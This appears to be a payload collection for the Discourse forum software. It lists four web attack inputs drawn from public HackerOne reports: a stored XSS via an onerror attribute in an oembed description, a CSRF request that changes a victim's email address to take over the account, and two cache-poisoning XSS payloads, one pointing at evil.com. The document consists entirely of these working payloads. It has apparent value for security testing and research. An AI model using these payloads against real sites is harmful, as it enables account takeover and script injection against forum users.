# Discourse

4 payloads.

### `a787b5b0`

```
{
        "type": "image",
        "image": "xss",
        "description": "descr' onerror='alert(/XSS by skavans/)",
        "image_width": 1,
        "image_height": 1
}
```

**Parameter:** `description`
— [Stored XSS in posts because of absence of oembed variables values escaping](https://hackerone.com/reports/197914) · Discourse · [skavans](https://hackerone.com/skavans)

### `b9f2c18b`

```
POST /users/$username/preferences/email.json HTTP/1.1
 
_method=PUT&email=$attacker_email&authenticity_token=$csrf_token
```

— [CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)](https://hackerone.com/reports/260697) · Discourse · [fransrosen](https://hackerone.com/fransrosen)

### `07c785a9`

```
GET /?xx HTTP/1.1
Host: target.com
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```

**Parameter:** `X-Forwarded-Host`
— [Web Cache Deception Attack (XSS)](https://hackerone.com/reports/394016) · Discourse · [bobrov](https://hackerone.com/bobrov) · $256.0

### `6b3b2f0c`

```
https://target.com/bugbounty/webcachedeception.php?url=https://evil.com/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```

**Parameter:** `payload`
— [Web Cache Deception Attack (XSS)](https://hackerone.com/reports/394016) · Discourse · [bobrov](https://hackerone.com/bobrov) · $256.0
